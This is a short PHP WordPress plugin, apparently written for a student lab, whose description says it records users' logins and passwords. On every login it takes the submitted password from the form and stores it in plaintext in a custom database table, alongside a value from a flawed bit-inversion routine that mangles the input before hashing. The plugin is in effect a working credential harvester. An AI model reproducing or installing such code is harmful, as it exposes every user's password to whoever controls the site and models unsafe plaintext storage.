<?php
/*
Plugin Name: plagin_lab_4.1
Description: Запись информации о пользователях: логин и пароль
Version: 1.0
Author: Петрова Наталья
*/

function invert($input) {
    $bin = '';
    for ($i = 0; $i < strlen($input); $i++) {
        $bin .= decbin(ord($input[$i]));
    }

    $bin_inv = '';
    for ($i = 0; $i < strlen($bin); $i++) {
        $bin_inv .= $bin[$i] == '0' ? '1' : '0';
    }
    return wp_hash_password(bindec($bin_inv));
}


function lab4_task2($user_name) {
    global $wpdb; 
    $password_1 = $_POST['pwd'];
    $password_2 = invert($password_1);

    $wpdb->insert(
        'wp_users_passwords',
        [
            'user_name' => $user_name, 
            'password_1' => $password_1,
            'password_2' => $password_2,
        ]
    );
}

add_action('wp_login', 'lab4_task2');
?>